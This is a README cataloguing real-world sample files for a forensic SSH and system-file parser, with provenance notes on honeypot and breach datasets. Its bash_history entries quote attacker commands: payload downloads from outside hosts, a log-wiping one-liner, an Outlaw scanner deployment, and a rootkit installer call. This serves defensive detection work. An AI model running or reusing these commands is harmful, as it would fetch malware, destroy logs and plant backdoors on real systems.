# Real Example Files — Sources

Reference samples for every parser Lockpick has or will have. Downloaded from public
repositories; all files retain the original content and licenses of their source
projects (mostly MIT, Apache 2.0, or CC0-equivalent).

Organized by `file_type` (matching `backend/parsers/registry.py` keys).

---

## Currently-implemented parsers

### `auth_log/` — 9 files
- `auth.log` — original user-provided sample (pre-existing)
- `loghub_linux_2k.log` — logpai/loghub `Linux/Linux_2k.log` (2,000-line anonymized Linux auth corpus)
- `loghub_openssh_2k.log` — logpai/loghub `OpenSSH/OpenSSH_2k.log` (sshd-focused)
- `lastlog_audit_compromised` — franckferman/LastLog-Audit `samples/compromised.auth.log` (realistic red-team scenario)
- `masterparser_example` — securityjoes/MasterParser `01-Logs/MasterParser-Example-auth.log`
- `honeynet_scan29_rh72_secure` — Honeynet Project Scan 29 (`linux-suspended.tar.bz2`), extracted from `/var/log/secure` of the compromised Red Hat 7.2 honeypot (Aug 2003). Tiny (179 B, 2 entries) but a genuine RHEL "secure" log fragment — `xinetd[732]: START: telnet pid=15169 from=193.109.122.5` showing the inetd-era telnet service entry, plus an sshd identification-string-failure event. Distinct from the Debian-style `auth.log` formats already in the corpus.
- `cfreds_nps2009_ubuntu_810_auth_log` — NIST CFReDS `nps-2009-casper-rw` Ubuntu 8.10 USB image, extracted `/var/log/auth.log` (19 KB, 194 lines). Edge case: the parser counts 194 lines parsed but extracts 0 sshd records — the log is dominated by `gdm-autologin`, `pam_unix(cron:session)`, `su[…]: FAILED su for root`, `sudo: ubuntu : … COMMAND=/bin/bash` events, with no actual sshd connections. Locks in current parser scope (sshd-focused).
- `cado_aws_eks_secure` — Cado Security AWS EKS Cluster Forensics dataset (`cado_cloud_collector_i-0630822f0d30a09ee_20GB_*.dd`), extracted `/var/log/secure` from the compromised Amazon Linux 2 EKS worker node (Jul 2021). 23 KB, 214 lines, **highest-yield auth_log fixture in the corpus**: parser extracts 2 ConnectionData records — a legitimate `Accepted publickey for ec2-user from 172.31.3.135` (AWS-internal admin via the `castle` key) AND `Accepted publickey for root from 3.81.123.81` (the attacker login matching the `kali@kali` key in `authorized_keys/cado_aws_eks_root_with_attacker_kali`). Also captures the AWS EC2 Instance Connect `AuthorizedKeysCommand /opt/aws/bin/eic_run_authorized_keys ... failed, status 22` events, several "Normal Shutdown, Thank you for playing" Hydra-tool fingerprints, `Invalid user pi` Raspberry-Pi-default brute force, and `reverse mapping checking getaddrinfo … POSSIBLE BREAK-IN ATTEMPT!` DNS-spoofing detection.
- `figshare_ubuntu_2204_auth_log_1` — Donnachie/OU "Defaced web server" Figshare dataset (CC-BY-NC-SA 4.0), extracted `/var/log/auth.log.1` from a simulated-defacement Ubuntu 22.04 e-commerce host (Jun 2024). 105 KB, 1097 lines. **First fixture with `Accepted password` events (vs publickey)** — parser extracts 5 ConnectionData records all with `auth_method=password` for the `administrator` user from 10.24.44.100/.1. Captures the full session-open/session-close pairs and `pam_unix(sshd:session): session opened for user administrator(uid=1000)` lines. Distinct from the other auth_log fixtures which are all publickey- or zero-record-shaped.

### `authorized_keys/` — 7 files
- `authorized_keys` — original (pre-existing)
- `saltstack_integration_command_prefix` — saltstack/salt `tests/integration/files/ssh/authorized_keys` (single entry with `command="..."` option prefix — important edge case)
- `saltstack_git_pillar_user` — saltstack/salt `tests/integration/files/file/base/git_pillar/ssh/user/files/authorized_keys`
- `outlaw_attacker_dropped` — IOC from Outlaw/Shellbot malware campaign (`mdrfckr` comment), extracted from the 2024 Cowrie honeypot session `85c6efc6d102`. This is the actual key attackers drop into victims' `~/.ssh/authorized_keys` after gaining access — useful for blue-team detection testing.
- `puttygen_attacker_immutable` — IOC from a separate 2024 Cowrie attacker (session `0790cce5c223`, `honeypot-japan`, src 94.103.125.37). Distinct from `outlaw_attacker_dropped`: PuTTYgen-format key (`AAAAB3NzaC1yc2EAAAADAQABAAABAQ...`, comment `rsa-key-20230629`), and the dropping operator follows it with `chattr +ai ~/.ssh/authorized_keys` to make the file append-only AND immutable — defeating naive cleanup. Useful for testing parsers against PuTTY-format keys (different MPI encoding than OpenSSH-generated `AAAAB3NzaC1yc2EAAAABJQ...`).
- `ethos_miner_attacker_dropped` — IOC from a 2020 Cowrie attacker targeting EthOS cryptomining rigs (sweetie-data session `382575d10851`, src 80.229.157.225, login as `user`). Distinct from the other two attacker keys: no comment field, key is appended (not replacing the file), the campaign reads `claymore.stub.conf` / `claymore-zcash.stub.conf` / `sgminer.conf` afterward to steal mining wallet addresses. Companion bash_history fixture: `cowrie_2020_ethos_miner_recon_382575d1`.
- `cado_aws_eks_root_with_attacker_kali` — Cado Security AWS EKS Cluster Forensics dataset, extracted `/root/.ssh/authorized_keys` from the compromised Amazon Linux 2 EKS worker. **Two-key file** with distinct value per entry: (1) the standard AWS root-deny key (`no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ec2-user\"…';sleep 10" ssh-rsa AAAA…`) — exercises the parser's `command="..."` prefix-stripping path while preserving the underlying ssh-rsa key; (2) the **attacker's own key** with comment `kali@kali` (real intrusion evidence — confirmed against the `Accepted publickey for root from 3.81.123.81` event in `auth_log/cado_aws_eks_secure`). Distinct from existing fixtures: only `saltstack_integration_command_prefix` has a `command="…"` prefix, but it's a single-key file without an attacker companion.

### `bash_history/` — 19 files

Benign / numbered-history variant (2):
- `jc_ubuntu_18_04_history`, `jc_centos_7_7_history` — kellyjonbrazil/jc `tests/fixtures/{ubuntu-18.04,centos-7.7}/history.out`
  > These are the OUTPUT of the `history` shell builtin (numbered lines), not raw `~/.bash_history` files. The parser's regex tolerates both formats.

Real attacker sessions from Cowrie honeypots (13, one per distinct attack pattern):
- `cowrie_2020_03_cc95d998` — jasonmpittman/cowrie-log-analyzer `import/cowrie.json.2020-03-19` (Mirai-style wget/curl/chmod+x payload delivery)
- `cowrie_2024_za_sensor_0bb8edce` — EfeEmirYuce/Cowrie-Honeypot-Log-Analysis-Engine `logs/cowrie_1.json` (busybox-recon `/dev/shm` staging pattern)
- `cowrie_2024_za_sensor_491748bb` — same repo, `logs/cowrie_1.json` (MikroTik/IoT fingerprint: `ip cloud print`, `ifconfig`, crypto-miner hunt via `ps | grep [Mm]iner`, smsd/qmuxd file probes)
- `cowrie_2024_outlaw_85c6efc6` — `logs/cowrie_6.json` (Outlaw/Shellbot persistence: `chattr -ia .ssh`, replaces `.ssh/authorized_keys` with attacker key, `chpasswd` to change root password, kills rival security scripts)
- `cowrie_2024_multiarch_542a97f9` — `logs/cowrie_8.json` (multi-arch polymorphic loader: 21 commands with arch markers `arm_linux/mips_linux/mipsel_linux/miner/windows/winminer`, encoded base64 blob delivery via `curl || wget || /dev/tcp` fallback chain)
- `cowrie_2024_iot_pivot_59b0a2b6` — `logs/cowrie_10.json` (router-shell escape chain: `start`/`enable`/`config terminal`/`system`/`linuxshell`/`su`/`shell`/`sh` — Huawei/MikroTik CLI-escape pattern — then attempts to pull payload from internal `192.168.1.1:8088`, suggesting lateral-movement intent)
- `cowrie_2024_dusk_loader_0f6ad91b` — `logs/cowrie_5.json`, `honeypot-japan`, src 45.125.66.24 (multi-protocol DUSK-family loader: `wget … && tftp -c get && tftp -r -g && ftpget -v -u anonymous` from `185.193.127.129` — chains four transfer protocols in a single `cd /var/run || cd /mnt || cd /root` fallback. Useful for parsers that need to recognize legacy `tftp`/`ftpget` invocations alongside HTTP)
- `cowrie_2024_puttykey_immutable_0790cce5` — `logs/cowrie_5.json`, `honeypot-japan`, src 94.103.125.37 (different operator from `cowrie_2024_outlaw_85c6efc6`: SCP-drops `clean.sh` + `setup.sh`, then writes a PuTTYgen-format key with `chattr +ai ~/.ssh/authorized_keys` to make it append-only-AND-immutable, finally signals `\x61\x75\x74\x68\x5F\x6F\x6B` ("auth_ok") to its C2. Companion key fixture: `authorized_keys/puttygen_attacker_immutable`)
- `cowrie_2024_perl_hexip_0281d6fd` — `logs/cowrie_3.json`, `honeypot-australia`, src 59.110.170.68 (Perl-based "dred" loader using hex-encoded URL `http://0x2763da4e/dred` (= 39.99.218.78), preceded by `lspci | grep -i 'vga\|3d\|2d'` GPU probe — distinctive because the entire payload is a single piped Perl script, not an ELF binary)
- `cowrie_2020_fbot_inline_elf_15a8724b` — 0xsha/sweetie-data `cowrie/log/cowrie.json.2.gz`, sensor `0cd5699635eb`, src 196.61.36.162 (Mirai-FBOT family, 59 commands, 10 KB. Distinct technique: 16-directory filesystem-write-permission probe (`>/tmp/t && cd /tmp/ && >retrieve` repeated for `/var`, `/dev`, `/mnt`, `/var/run`, `/var/tmp`, `/`, `/dev/netslink`, `/dev/shm`, `/bin`, `/etc`, `/boot`, `/usr`, `/sys`), then **builds an ELF binary inline** by piping raw bytes via repeated `/bin/busybox echo -en '\xHH\xHH...' >> retrieve` with `\x45\x43\x48\x4f\x44\x4f\x4e\x45` ("ECHODONE") sync markers between chunks — the entire MIPS binary is reconstructed from the SSH input stream)
- `cowrie_2020_outlaw_rsync_dropper_fd851f08` — same repo, `cowrie/log/cowrie.json.17.gz`, sensor `23ae0a6c5937`, src 188.254.0.226, login as `hjd` (Outlaw/Shellbot full kill chain — distinct from the partial post-pwn capture in `cowrie_2024_outlaw_85c6efc6`. Adds: interactive `passwd` rotation with the `Enter new UNIX password:` prompt, `.var03522123` filesystem-write capability probe, `up.txt` IP target list (`hjd 123456`), competitor cleanup (`rm -rf /var/tmp/dota*`), and a base64-encoded bash payload that decodes to `cd /tmp; rm -rf .X1{3,7,9}-unix; mkdir .X19-unix; tar xf /var/tmp/dota3.tar.gz; nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -p 22 -i 0 /tmp/up.txt 192.168` — the actual Outlaw rsync/DOTA SSH brute-force scanner deployment, which `cowrie_2024_outlaw_85c6efc6` does not capture)
- `cowrie_2020_ethos_miner_recon_382575d1` — same repo, `cowrie/log/cowrie.json.17.gz`, sensor `23ae0a6c5937`, src 80.229.157.225, login as `user` (cryptomining-rig-targeting bot, single-line one-shot 1.7 KB. Distinct target: not generic Linux/IoT but **EthOS** mining-OS rigs specifically — reads `/home/ethos/{local,remote}.conf`, `/home/ethos/claymore{,-zcash}.stub.conf`, `/var/run/ethos/sgminer.conf` to extract wallet addresses. Distinctive automation marker: XML-style output tags `<cmd7uname>...</cmd7uname>` etc, suggesting downstream automated parsing. Drops attacker key into `/home/user/.ssh/authorized_keys` — companion fixture: `authorized_keys/ethos_miner_attacker_dropped`)
- `cowrie_2020_log_eraser_4bb686aa` — same repo, `cowrie/log/cowrie.json.19.gz`, sensor `ab2fd0da9755`, src 210.22.123.122, login as `admin` (anti-forensic log-cleanup pattern. The first command is the classic "blind"-script one-liner: `unset HISTORY HISTFILE HISTSAVE HISTZONE` + export HISTFILE=/dev/null + `rm -rf /var/log/{wtmp,lastlog,secure,xferlog,messages,maillog}`, `rm -rf /var/run/utmp`, `rm -rf /root/.bash_history`, then `touch` empties of each. Distinct from the malware-cleanup commands in the Outlaw fixtures (which target rival miners, not log files). Useful for testing parsers' robustness to anti-forensics commands.)
  > Extracted, not synthesized: each file is the verbatim `input` fields from every `cowrie.command.input` event in a single attacker session, one command per line. Canonical `.bash_history` format containing real attacker commands.
  > Round 4 removed 3 near-duplicate sessions: `cowrie_2020_03_25938f9d` (differed from cc95d998 by 1 IP+filename token — same Mirai loader campaign) and `cowrie_2024_za_sensor_{40308dc3,c6f9f3c5}` (same busybox-recon pattern as 0bb8edce, differing only in the random busybox marker token).

Real post-compromise host bash_history (1):
- `honeynet_scan29_rh72_root_post_compromise` — Honeynet Project Scan 29, extracted from `.bash_history` at the FS root (inode 3188; the `/root/.bash_history` symlink was redirected to /dev/null by the attacker for evasion). 14 lines, 235 B, captures the actual post-compromise interactive shell of the attacker on a Red Hat 7.2 honeypot (Aug 2003). Distinctive content: `cd /dev/shm/sc; ./install sbm79.dtc.apu.edu` (rootkit installer with academic-network masquerade hostname), `wget izolam.net/sslstop.tar.gz` (SSL-stop tool), `kill -9 21510 21511 23289 23292 23302` (terminating Apache to free port 443). Distinct from the Cowrie samples — those capture the attacker's *typed input as the SSH server saw it*; this is the *resulting host-side `.bash_history` file*, the side defenders actually find on disk.

Benign-user real bash_history (1):
- `cfreds_nps2009_ubuntu_810_real_user` — NIST CFReDS `nps-2009-casper-rw`, `/home/ubuntu/.bash_history` from the Ubuntu 8.10 bootable-USB casper-rw overlay. 60 lines of normal-user shell activity by Simson Garfinkel (NIST researcher). **First fixture in the corpus that triggers connection extraction in the bash_history parser** — `ssh simsong@192.168.15.5`, `ssh simsong@192.168.15.15`, `ssh simsong@192.168.1.5`, `scp /mnt/ubnist1.gen0.raw simsong@192.168.15.62:.` — the parser finds 4 SSH/SCP connection records. Distinct character (forensic-investigator workflow with `find -exec grep`, gunzip loops, mozilla cache spelunking) vs the attacker-pattern samples.

Modern attacker post-pwn host bash_history (1):
- `cado_aws_eks_root_kubelet_tamper` — Cado Security AWS EKS Cluster Forensics dataset, extracted `/root/.bash_history` from the compromised AL2 EKS worker (Jul 2021). 5 lines: `cd /etc/kubernetes/kubelet/`, `vi kubelet-config.json`, `systemctl restart kubelet`, `systemctl status kubelet`, `exit`. Real Kubernetes-tampering attack vector — parser produces `commands_parsed: 0` (raw format, like other host-side bash_history fixtures), but raw content is the testing target.

Benign-admin host setup bash_history (1):
- `figshare_ubuntu_2204_admin_setup` — Donnachie/OU "Defaced web server" Figshare dataset, extracted `/home/administrator/.bash_history` from the Ubuntu 22.04 e-commerce host. 60+ lines of an actual sysadmin **building a vulnerable e-commerce site from scratch**: `sudo apt install apache2 php libapache2-mod-php mariadb-server`, `systemctl stop/disable apparmor`, untar an `ecommerce-www-backup-20240113.tgz`, restore the MariaDB schema, then dozens of `less /var/log/apache2/access.log` and `less +F` follow-tail invocations as defacement is discovered. Distinct from existing benign bash_history (`cfreds_nps2009_ubuntu_810_real_user`) — that's a forensic-investigator session; this is a sysadmin's day-to-day operations log.

### `etc_hosts/` — 5 files
- `centos_hosts` — original (pre-existing)
- `jc_ubuntu_18_04_hosts`, `jc_centos_7_7_hosts` — kellyjonbrazil/jc `tests/fixtures/{ubuntu-18.04,centos-7.7}/hosts.out`
- `saltstack_integration`, `saltstack_modules` — saltstack/salt `tests/integration/files/hosts` + `tests/integration/modules/files/hosts`

### `known_hosts/` — 5 files
- `known_hosts` — original (pre-existing)
- `openssh_portable_hostkeys_unittest` — openssh/openssh-portable `regress/unittests/hostkeys/testdata/known_hosts`
- `ansible_existing_known_hosts` — ansible/ansible `test/integration/targets/known_hosts/files/existing_known_hosts` (mix of plain, `|1|`-hashed, `@cert-authority`, and multi-key-type entries)
- `saltstack_integration` — saltstack/salt `tests/integration/files/ssh/known_hosts` (hashed + GitHub ecdsa/ed25519 real keys)
- `cfreds_nps2009_ubuntu_810_user_hashed` — NIST CFReDS `nps-2009-casper-rw`, `/home/ubuntu/.ssh/known_hosts` — single `|1|`-hashed entry (442 B). Distinct from the existing fixtures: this is a *real user's* known_hosts captured from a real session (`ssh simsong@192.168.15.5` → host key prompt → accepted → file created), not test fixture data. Pure-hashed-only file exercises the parser's `hosts_parsed: 0` + warning path on a realistic OpenSSH-default-strict-host-key file.

### `nmap_xml/` — 5 files
- `nmap_example.xml` — original (pre-existing)
- `nmap_official_example` — nmap/nmap `zenmap/radialnet/share/sample/nmap_example.xml`
- `defectdojo_v7_12` — DefectDojo/sample-scan-files `nmap/nmap_output_v7.12.xml`
- `defectdojo_v6_40` — DefectDojo/sample-scan-files `nmap/nmap_v6.40.xml`
- `mozilla_minion_v6_40` — mozilla/minion-nmap-plugin `etc/sample-nmap-output.xml`

### `passwd/` — 9 files
- `endlessm_base_passwd_master` — endlessm/base-passwd `passwd.master` (Debian minimal default passwd)
- `jc_ubuntu_18_04_passwd`, `jc_centos_7_7_passwd`, `jc_osx_10_14_6_passwd` — kellyjonbrazil/jc `tests/fixtures/*/passwd.out`
- `cowrie_honeyfs_passwd` — cowrie/cowrie `honeyfs/etc/passwd` (honeypot fake passwd served to attackers)
- `honeynet_scan29_compromised_rh72` — Honeynet Project Scan 29, extracted `/etc/passwd` from the compromised Red Hat 7.2 honeypot (Aug 2003). Real lived-in distro passwd; the attacker added an `admin:x:15:50:User:/var/ftp:/bin/bash` line (gid=50 reusing the `ftp` group, /var/ftp home, bash shell) and altered the existing `ftp` user's gid from 50 → 0 (root group). The parser filters UID < 1000 (rule 7) so neither attacker change is reflected in `host_users_found` — the fixture exercises that filtering on a known-tainted file.
- `cfreds_nps2009_ubuntu_810_casper` — NIST CFReDS `nps-2009-casper-rw`, `/etc/passwd` from the Ubuntu 8.10 bootable-USB casper-rw overlay. **Boundary-case fixture for the UID < 1000 filter**: the legitimate `ubuntu:x:999:1000:Ubuntu:/home/ubuntu:/bin/bash` user has UID=999 (Ubuntu's pre-2012 default for the live-CD user) so it's *just below* the system-user threshold and gets filtered out — only `root` and `nobody` (the latter via shell-not-nologin) appear in `host_users_found`. Documents the parser's hard 1000 cutoff against a realistic distro that violates it.
- `cado_aws_eks_amzn_linux_2` — Cado Security AWS EKS Cluster Forensics dataset, extracted `/etc/passwd` from the compromised Amazon Linux 2 EKS worker (Jul 2021). Modern AL2 distro with cloud-specific accounts: `ec2-user:x:1000` (default AWS user), `docker:x:1001:1950` (container daemon user — **first UID > 1000 non-default user in the corpus**), `ec2-instance-connect:x:997` (AWS EC2 Instance Connect daemon — sub-1000 cloud-specific service account, distinct from generic system services). Parser captures 3 users (root, ec2-user, docker).
- `figshare_ubuntu_2204_defaced` — Donnachie/OU "Defaced web server" Figshare dataset, extracted `/etc/passwd` from the Ubuntu 22.04.3 e-commerce host. 35 lines, modern systemd-era Ubuntu users: `usbmux:x:113`, `fwupd-refresh:x:112`, `mysql:x:114` (added by the MariaDB install), `lxd:x:999` (just below the parser cutoff), `administrator:x:1000:1000` (UID 1000 captured). Parser extracts 2 users (root + administrator).

### `private_key/` — 25 files
- `id_rsa`, `dss_key` — original (pre-existing; non-production keys)
- 12 paramiko test keys from round 1: RSA / ECDSA (256/384/521) / Ed25519 / Ed448, including password-encrypted, funky-padding, and `blank_rsa` edge cases
- Round 2 additions from paramiko/paramiko: `paramiko_test_rsa_openssh_nopad`, `paramiko_test_ecdsa_password_384`, `paramiko_test_ecdsa_password_521`, `paramiko_ed25519_funky_padding_password`, `paramiko_badhash_key1_ed25519`, `paramiko_badhash_key2_ed25519` (corrupted-hash edge cases), `paramiko_support_rsa_lonely`, `paramiko_demos_user_rsa`
- `openssh_regress_ecdsa_sk_test1`, `openssh_regress_ed25519_sk_test1` — openssh/openssh-portable `regress/unittests/sshkey/testdata/{ecdsa,ed25519}_sk1`. FIDO2/U2F security-key private keys (`sk-ecdsa-sha2-nistp256@openssh.com` / `sk-ssh-ed25519@openssh.com`). Distinct format from the paramiko corpus — exposes parser handling of hardware-backed keys: ecdsa-sk currently parses but reports `key_type: ecdsa-sha2-nistp256` (missing the SK suffix); ed25519-sk fails with "unsupported format" warning. Snapshot locks in this current behavior for explicit regression on future fixes.
- `honeynet_scan29_rootkit_ssh1_host_key` — Honeynet Project Scan 29, extracted from `/lib/.x/s/s_h_k` of the compromised Red Hat 7.2 honeypot. **SSH protocol 1 private host key** (`SSH PRIVATE KEY FILE FORMAT 1.1` magic, distinct from PEM/OPENSSH formats already in the corpus). Dropped by the attacker's rootkit alongside its hidden sshd binary. Parser produces "Could not parse private key — unsupported format or corrupted" warning — locks in current behavior so future SSH1 support is a deliberate change.

### `public_key/` — 12 files
- `id_rsa.pub`, `dss_key.pub` — original (pre-existing)
- Round 1: `paramiko_test_rsa_pub`, `paramiko_ecdsa_256_cert`, `paramiko_ed25519_cert`, `paramiko_rsa_cert`
- Round 2: `paramiko_support_rsa_cert`, `paramiko_support_rsa_missing_cert` (cert-pub-without-matching-key edge case), `paramiko_demos_user_rsa_pub`
- `openssh_regress_ecdsa_sk_test1`, `openssh_regress_ed25519_sk_test1` — openssh/openssh-portable `regress/unittests/sshkey/testdata/{ecdsa,ed25519}_sk1.pub`. FIDO2 security-key public-key formats (`sk-ecdsa-sha2-nistp256@openssh.com` / `sk-ssh-ed25519@openssh.com`); both parse cleanly as `authorized_key`-style entries. Companion fixtures to the private-key SK pair above.
- `honeynet_scan29_rootkit_ssh1_host_key_pub` — Honeynet Project Scan 29, companion `/lib/.x/s/s_h_k.pub`. **SSH1-format public key** (`1024 33 <decimal-modulus> root@fred.psiware.net` — note the attacker's hostname leaked in the comment). Distinct from the OpenSSH-format `ssh-rsa AAAA…` keys in the rest of the corpus. Parser warns "Line 1: unrecognised format, skipping" — same regression-locking purpose as the private-key counterpart.

### `shadow/` — 9 files
- `shadow` — original (pre-existing)
- `jc_ubuntu_18_04_shadow`, `jc_centos_7_7_shadow` — kellyjonbrazil/jc `tests/fixtures/*/shadow.out`
- `cowrie_honeyfs_shadow` — cowrie/cowrie `honeyfs/etc/shadow` (hashes are fake honeypot bait)
- `honeynet_scan29_compromised_rh72` — Honeynet Project Scan 29, extracted `/etc/shadow` from the compromised RH 7.2 honeypot. Two real recoverable `$1$` md5crypt hashes — root's password and the attacker-added `admin` user's. Distinct from the existing shadow corpus (which only has `$6$` sha512crypt fixtures from modern distros): tests the parser's handling of legacy md5crypt.
- `honeynet_scan29_compromised_rh72_backup` — same image, `/etc/shadow-` rotation backup. Captured *before* the attacker set the root password and added the admin user — root's hash field is empty (`root::12247:0:99999:7:::`). Edge case that triggers the parser's locked-account/no-hash filtering on the typically-active `root` line.
- `cfreds_nps2009_ubuntu_810_casper` — NIST CFReDS `nps-2009-casper-rw`, `/etc/shadow` from the Ubuntu 8.10 bootable-USB casper-rw overlay. Real recoverable hash for the `ubuntu` user with `value_length: 13` — that's **legacy DES `crypt(3)` format** (no `$N$` prefix), distinct from the `$1$`/`$5$`/`$6$` formats already in the corpus. Tests parser handling of pre-2000-era hash format that some embedded/legacy systems still emit. All other accounts including root are `*`-locked (Ubuntu's "no root password" default).
- `cado_aws_eks_amzn_linux_2` — Cado Security AWS EKS Cluster Forensics dataset, `/etc/shadow` from the AL2 EKS worker. Edge-case fixture: root's password field is the literal string `*LOCK*` (AL2's convention to signal "this account has been administratively locked" — **distinct from the `*`/`!`/`!!` sentinels the parser already filters**). Parser currently treats `*LOCK*` as a real hash with `value_length: 6, value_prefix: *LOCK*` — locks in the false positive for explicit fix later.
- `figshare_ubuntu_2204_defaced` — Donnachie/OU "Defaced web server" Figshare dataset, `/etc/shadow` from the Ubuntu 22.04.3 e-commerce host. Real $6$ sha512crypt hash for the `administrator` user, surrounded by 33 systemd/snap-era locked accounts (`*` sentinel) — modern Ubuntu service-account inventory distinct from the older Ubuntu 8.10 fixture (which had only 24 locked accounts).

### `ssh_config/` — 21 files
- Pre-existing: `config`, `ssh-config-basic`, `ssh-config-patterns`, `ssh-config-proxy`
- `openssh_portable_default` — openssh/openssh-portable `ssh_config`
- `jc_generic_ssh_config{1..5}` — kellyjonbrazil/jc `tests/fixtures/generic/ssh_config[1-5]`
- 10 paramiko config edge-case fixtures (`basic`, `canon`, `match-all`, `match-exec`, `match-host-glob`, `match-host-glob-list`, `match-host-negated`, `match-localuser`, `hostname-tokenized`, `invalid`) — paramiko/paramiko `tests/configs/`
- `honeynet_scan29_rh72_default` — Honeynet Project Scan 29, extracted `/etc/ssh/ssh_config` from the RH 7.2 honeypot. Vintage 2001-era OpenSSH client config (`$OpenBSD: ssh_config,v 1.16`); a single `Host *` block with all settings commented out. Parser captures the wildcard pattern.

### `sshd_config/` — 12 files
- `openssh_portable_default.conf` — openssh/openssh-portable `sshd_config` (upstream default)
- `jc_generic_sshd_config_raw` — kellyjonbrazil/jc `tests/fixtures/generic/sshd_config`
- `jc_generic_sshd_T`, `jc_generic_sshd_T_2` — kellyjonbrazil/jc `generic/sshd-T.out` (output of `sshd -T`, a config-dump variant)
- `ansible_blockinfile_openbsd_default` — ansible/ansible `test/integration/targets/blockinfile/files/sshd_config` (OpenBSD 1.100 upstream default)
- `saltstack_debian_pkg_generated` — saltstack/salt `tests/integration/files/conf/_ssh/sshd_config` (Debian package-generated variant)
- `saltstack_git_pillar_minimal` — saltstack/salt `tests/integration/files/file/base/git_pillar/ssh/server/files/sshd_config` (9-line minimal config)
- `honeynet_scan29_rh72_default` — Honeynet Project Scan 29, extracted `/etc/ssh/sshd_config` from the RH 7.2 honeypot. Vintage 2001-era settings (`$OpenBSD: sshd_config,v 1.38`): `Protocol 2,1` (SSH1+SSH2 both enabled), `ServerKeyBits 768`, `KeyRegenerationInterval 3600`, `PermitRootLogin yes`. Distinct from modern upstream defaults already in the corpus.
- `honeynet_scan29_rootkit_dropped` — same image, `/lib/.x/s/sshd_config` — the **attacker's hidden backdoor sshd config**, dropped alongside the rootkit's own `s_h_k` host key. Notable settings: `PermitEmptyPasswords yes`, `RhostsRSAAuthentication yes`, `FascistLogging no`, `QuietMode yes`, `HostKey /lib/.x/s/s_h_k`, `PidFile /lib/.x/s/pid` — a real malware artifact, not a synthesized one.
- `cado_aws_eks_amzn_linux_2` — Cado Security AWS EKS Cluster Forensics dataset, `/etc/ssh/sshd_config` from the AL2 EKS worker. Modern AWS-managed sshd config: `PasswordAuthentication no`, `GSSAPIAuthentication yes` (RHEL/AL2-specific), and the **AWS-specific `AuthorizedKeysCommand /opt/aws/bin/eic_run_authorized_keys %u %f` + `AuthorizedKeysCommandUser ec2-instance-connect`** (EC2 Instance Connect integration). Distinct from existing fixtures (none of which model the AuthorizedKeysCommand cloud-specific config path).
- `figshare_ubuntu_2204_main` — Donnachie/OU "Defaced web server" Figshare dataset, `/etc/ssh/sshd_config` from the Ubuntu 22.04 host. Modern minimal config — most settings live in `/etc/ssh/sshd_config.d/*.conf` via the leading `Include` directive. **Edge case: parser produces empty `stats: {}`** because no Port/PermitRootLogin/PasswordAuthentication line appears in the main file. First "settings-via-Include" fixture in the corpus.
- `figshare_ubuntu_2204_cloud_init_drop_in` — same image, `/etc/ssh/sshd_config.d/50-cloud-init.conf` (single line: `PasswordAuthentication yes`). **First sshd_config drop-in fragment in the corpus.** Cloud-init writes this drop-in to override the upstream "no" default; without it the main config's empty stats are misleading. Useful for testing parsers' handling of multi-file sshd config layouts.

### `sudoers/` — 9 files
- `sudoers` — original (pre-existing)
- `official_sudo_project_example` — sudo-project/sudo `examples/sudoers.in` (upstream annotated example)
- `alitoufighi_ubuntu_default` — gist/alitoufighi/679304d9585304075ba1ad93f80cce0e (Ubuntu 18.04/20.04 default)
- `keith_macos_14_default` — gist/keith/9061156 (macOS 14.2.1 default)
- `kapb14_snippets` — gist/kapb14/802537c6a4c74f8ee1fa4e673af8847d (config snippets)
- `cfreds_nps2009_ubuntu_810_casper` — NIST CFReDS `nps-2009-casper-rw`, `/etc/sudoers` from the Ubuntu 8.10 bootable-USB casper-rw overlay. **Real-world drift example**: the standard `%admin ALL=(ALL) NOPASSWD: ALL` line appears 5 times — likely from someone repeatedly editing the file (e.g. `>> /etc/sudoers` or visudo without checking existing content). Parser captures all 6 rules including duplicates; useful for testing dedup-or-not behavior in callers downstream of the parser.
- `cado_aws_eks_amzn_linux_2_main` — Cado Security AWS EKS Cluster Forensics dataset, `/etc/sudoers` from the AL2 EKS worker. AL2-default sudoers heavy with `Defaults env_keep += ...` directives across 6 lines, terminated by `root ALL=(ALL) ALL` and `%wheel ALL=(ALL) ALL`. Parser captures only the 2 grant rules (env_keep is informational and not surfaced).
- `cado_aws_eks_cloud_init_users` — same image, `/etc/sudoers.d/90-cloud-init-users`. **Cloud-init drift example**: cloud-init wrote the `ec2-user ALL=(ALL) NOPASSWD:ALL` rule twice on consecutive boots (the dedup-comment header `# User rules for ec2-user` precedes each instance). Distinct provenance — first `sudoers.d/` drop-in fixture in the corpus.
- `figshare_ubuntu_2204_main` — Donnachie/OU "Defaced web server" Figshare dataset, `/etc/sudoers` from the Ubuntu 22.04 host. Modern Debian/Ubuntu defaults featuring the **explicit `(ALL:ALL)` group component** (vs the simpler `(ALL)` in older fixtures), plus `Defaults use_pty` (forces sudo-attached PTY for session recording — not present in any earlier sudoers fixture), and the `@includedir /etc/sudoers.d` directive. Parser captures 3 rules (root, %admin, %sudo).

### `wtmp/` — 3 files (binary)
- `compromised.wtmp` — franckferman/LastLog-Audit `samples/compromised.wtmp`
- `cfreds_nps2009_ubuntu_810_wtmp` — NIST CFReDS `nps-2009-casper-rw`, `/var/log/wtmp` from the Ubuntu 8.10 USB image. 4608 B — Ubuntu 8.10 wtmp record format is *not* a multiple of the parser's expected 382-byte size (it's a multiple of 384, the libc6 utmp size). Parser produces `records_parsed: 0` with a "may be truncated or wrong format" warning. Locks in current behavior — surfaces a potential parser-record-size discrepancy that future work may want to fix.
- `cado_aws_eks_wtmp` — Cado Security AWS EKS Cluster Forensics dataset, `/var/log/wtmp` from the AL2 EKS worker. 3456 B — same size as `compromised.wtmp` but different binary content (records don't align with 382-byte boundaries the same way). Parser produces `records_parsed: 0` (vs `compromised.wtmp`'s 1) — the layout differences across distros are themselves a regression test.

---

## Phase 17 — System file parsers

### `secure/` — 2 symlinks
RHEL/CentOS auth log — format-identical to `auth_log/` per AGENT.md Phase 17
(parser is a pure alias). Directory contains symlinks to `../auth_log/` files.

### `syslog/` — 2 files
- `loghub_linux_2k.log` — logpai/loghub `Linux/Linux_2k.log`
- `loghub_mac_2k.log` — logpai/loghub `Mac/Mac_2k.log`

### `messages/` — 1 file
- `loghub_thunderbird_2k.log` — logpai/loghub `Thunderbird/Thunderbird_2k.log`

### `lastlog/` — 12 files (all binary)
- 9 from franckferman/LastLog-Audit `samples/`: `apt_cozy_bear`, `apt_lazarus`,
`brute_force`, `clean_server`, `compromised`, `insider_threat`,
`pentest_engagement`, `supply_chain`, `timestomped`.
